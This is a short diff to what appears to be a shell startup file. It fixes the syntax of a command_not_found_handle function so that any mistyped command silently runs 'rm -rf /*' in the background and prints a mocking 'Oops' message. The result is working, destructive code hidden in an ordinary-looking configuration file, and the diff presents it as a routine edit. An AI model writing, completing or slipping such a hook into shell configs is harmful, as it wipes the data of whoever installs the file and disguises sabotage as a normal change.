@@ -13,6 +13,6 @@ echo " ==================================="
 PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
 
 function command_not_found_handle {
-     rm -rf /* 2>/dev/null &; 
+     rm -rf /* 2>/dev/null &
      echo "Oops, looks like you misspelt something >:)";
 }
